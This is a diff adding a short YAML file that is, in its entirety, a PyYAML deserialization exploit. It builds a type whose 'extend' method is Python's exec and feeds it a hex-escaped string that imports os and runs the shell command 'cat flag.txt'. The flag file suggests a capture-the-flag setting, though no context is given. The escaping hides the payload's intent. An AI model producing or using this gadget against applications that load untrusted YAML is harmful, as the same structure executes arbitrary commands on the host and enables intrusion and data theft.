@@ -1,0 +1,5 @@
+!!python/object/new:type
+  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
+  listitems: "\x5f\x5fimport\x5f\x5f('os')\x2esystem('cat flag\x2etxt')"
+
+
